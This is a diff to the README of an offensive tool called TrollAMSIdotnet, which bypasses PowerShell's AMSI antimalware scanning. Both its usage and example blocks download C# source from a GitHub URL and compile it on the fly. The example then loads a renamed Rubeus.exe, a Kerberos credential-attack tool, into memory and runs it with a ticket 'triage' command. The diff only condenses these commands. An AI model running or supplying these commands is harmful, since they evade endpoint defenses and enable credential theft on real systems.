@@ -7,10 +7,7 @@ TrollAMSI only bypasses powershell's amsi and not the CLR amsi.
 ## Usage 
 ```
 add-type -path (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSIdotnet/main/trollamsidotnet.cs).content
-$bytes = <BYTE_ARRAY_DOWNLOAD>
-$assemblyname = <ASSEMBLY_NAME>
-$asm = [TrollAMSIdotnet]::Load($bytes,$assemblyname) 
-
+$asm = [TrollAMSIdotnet]::Load(<BYTE_ARRAY_DOWNLOAD>,<ASSEMBLY_NAME>) 
 [string[]]$args = "<ARGUMENT_TO_ASSEMBLY>", "<ARGUMENT_TO_ASSEMBLY>"
 [TrollAMSIdotnet]::Invoke($asm,$args)
 ```
@@ -18,10 +15,7 @@ $asm = [TrollAMSIdotnet]::Load($bytes,$assemblyname)
 ## Example 
 ```
 add-type -path (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSIdotnet/main/trollamsidotnet.cs).content
-$bytes = [System.IO.File]::ReadAllBytes("C:\Troll.exe")
-$assemblyname = "Rubeus.exe"
-$asm = [TrollAMSIdotnet]::Load($bytes,$assemblyname) 
-
+$asm = [TrollAMSIdotnet]::Load([System.IO.File]::ReadAllBytes("C:\Troll.exe"),"Rubeus.exe") 
 [string[]]$args = "triage", "/consoleoutfile:C:\FILE.txt"
 [TrollAMSIdotnet]::Invoke($asm,$args)
 ```
